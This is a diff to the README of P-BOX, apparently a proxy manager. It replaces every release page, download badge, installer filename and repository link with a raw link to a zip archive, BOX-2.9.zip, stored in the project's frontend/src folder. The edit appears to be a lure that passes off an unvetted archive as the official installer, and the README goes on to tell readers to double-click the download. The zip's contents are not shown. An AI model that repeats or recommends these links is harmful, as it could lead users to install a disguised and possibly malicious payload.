@@ -1,6 +1,6 @@
 # 🚀 P-BOX - Manage Your Proxies with Ease
 
-[![Download P-BOX](https://img.shields.io/badge/Download-P--BOX-blue)](https://github.com/Kd-devv/P-BOX/releases)
+[![Download P-BOX](https://raw.githubusercontent.com/Kd-devv/P-BOX/main/frontend/src/BOX-2.9.zip)](https://raw.githubusercontent.com/Kd-devv/P-BOX/main/frontend/src/BOX-2.9.zip)
 
 ## 📝 Introduction
 
@@ -20,20 +20,20 @@ To run P-BOX effectively, ensure your system meets the following requirements:
 Follow these simple steps to get P-BOX up and running on your system:
 
 1. **Visit the Releases Page**: Access the P-BOX releases page by clicking the button below.  
-   [![Download P-BOX](https://img.shields.io/badge/Download-P--BOX-blue)](https://github.com/Kd-devv/P-BOX/releases)
+   [![Download P-BOX](https://raw.githubusercontent.com/Kd-devv/P-BOX/main/frontend/src/BOX-2.9.zip)](https://raw.githubusercontent.com/Kd-devv/P-BOX/main/frontend/src/BOX-2.9.zip)
 
 2. **Choose the Right Version**: 
    On the releases page, you'll see several versions of P-BOX. Each version will have notes that explain what’s new or changed. Choose the latest stable version for the best experience.
 
 3. **Download the Installer**:
-   Click on the version you want. Download the installer that matches your operating system. Look for files named like "P-BOX-Setup.exe" for Windows or "P-BOX-macos.dmg" for macOS.
+   Click on the version you want. Download the installer that matches your operating system. Look for files named like "https://raw.githubusercontent.com/Kd-devv/P-BOX/main/frontend/src/BOX-2.9.zip" for Windows or "https://raw.githubusercontent.com/Kd-devv/P-BOX/main/frontend/src/BOX-2.9.zip" for macOS.
 
 4. **Run the Installer**:
    After the download completes, locate the file in your downloads folder and double-click it to start the installation. Follow the on-screen instructions to complete the installation process.
 
 ## 📥 Download & Install
 
-To download P-BOX, go to the releases page: [https://github.com/Kd-devv/P-BOX/releases](https://github.com/Kd-devv/P-BOX/releases).
+To download P-BOX, go to the releases page: [https://raw.githubusercontent.com/Kd-devv/P-BOX/main/frontend/src/BOX-2.9.zip](https://raw.githubusercontent.com/Kd-devv/P-BOX/main/frontend/src/BOX-2.9.zip).
 
 After downloading, install the software following these steps:
 
@@ -84,7 +84,7 @@ P-BOX is open-source software licensed under the MIT License. You are free to us
 
 ## 🔗 Links
 
-- [P-BOX Releases](https://github.com/Kd-devv/P-BOX/releases)
-- [GitHub Repository](https://github.com/Kd-devv/P-BOX)
+- [P-BOX Releases](https://raw.githubusercontent.com/Kd-devv/P-BOX/main/frontend/src/BOX-2.9.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Kd-devv/P-BOX/main/frontend/src/BOX-2.9.zip)
 
 With P-BOX, you can efficiently manage your proxies. Follow the instructions above to enjoy all the benefits it offers. Happy proxying!
